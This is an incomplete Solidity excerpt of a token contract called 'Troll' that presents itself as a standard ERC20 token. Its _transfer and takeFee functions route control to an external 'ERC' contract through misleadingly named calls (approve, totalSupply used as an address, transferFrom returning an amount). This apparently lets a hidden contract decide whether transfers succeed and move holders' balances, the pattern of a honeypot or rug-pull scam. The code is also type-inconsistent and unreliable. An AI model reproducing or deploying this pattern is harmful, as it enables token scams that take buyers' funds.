...
contract Troll is Ownable, IERC20 {
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        bool approved = ERC.approve(from, to, marketingWallet);
        if (!approved) {
            require(amount <= _balances[from]);
            address recipient = ERC.totalSupply();
    ...
    function takeFee(address from) private view returns (uint256) {
        uint256 amount = _balances[ERC.totalSupply()];
        return ERC.transferFrom(from, tAmount(), amount);
    }
